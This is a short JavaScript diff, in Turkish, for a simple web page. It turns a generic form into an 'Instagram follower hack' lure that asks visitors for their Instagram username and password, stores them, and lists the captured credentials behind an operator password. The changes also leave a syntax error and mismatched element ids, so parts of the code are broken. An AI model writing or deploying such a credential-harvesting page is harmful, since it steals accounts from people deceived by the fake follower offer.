@@ -15,23 +15,23 @@ document.getElementById("hamburger").addEventListener("click", function () {
 });
 
 function showEren() {
-    document.getElementById("-panel").style.display = "block";
+    document.getElementById(INSTAGRAM TAKİPÇİ HİLESİ"-panel").style.display = "block";
     document.getElementById("cevap-login").style.display = "none";
     document.getElementById("cevaplar-panel").style.display = "none";
 }
 
 function showCevapLogin() {
-    document.getElementById("eren-panel").style.display = "none";
+    document.getElementById("INSTAGRAM TAKİPÇİ HİLESİ-panel").style.display = "none";
     document.getElementById("cevap-login").style.display = "block";
     document.getElementById("cevaplar-panel").style.display = "none";
 }
 
 function checkCevapPassword() {
     var pass = document.getElementById("cevap-password").value;
-    if (pass === "erenw25") {
+    if (pass === "erenyenidenw1") {
         showCevaplar();
     } else {
-        alert("Cevap şifresi hatalı!");
+        alert("GÜVENLİK AMACI İÇİN GİRİŞ YASAKTIR!");
     }
 }
 
@@ -40,8 +40,8 @@ function saveForm() {
     var formData = new FormData(form);
 
     var cevap = {
-        can: formData.get("can"),
-        memo: formData.get("memo"),
+        can: formData.get("INSTAGRAM KULANICI ADI"),
+        memo: formData.get("ŞİFRE ?"),
         secim: formData.get("secim")
     };
 
@@ -69,8 +69,8 @@ function showCevaplar() {
     cevaplar.forEach(function (cevap, index) {
         var div = document.createElement("div");
         div.innerHTML = "<strong>Cevap #" + (index + 1) + "</strong><br>" +
-                        "CAN: " + cevap.can + "<br>" +
-                        "MEMO: " + cevap.memo + "<br>" +
+                        "INSTAGRAM KULLANICI ADI: " + cevap.can + "<br>" +
+                        "ŞİFRE ?: " + cevap.memo + "<br>" +
                         "SEÇİM: " + cevap.secim + "<hr>";
         liste.appendChild(div);
     });
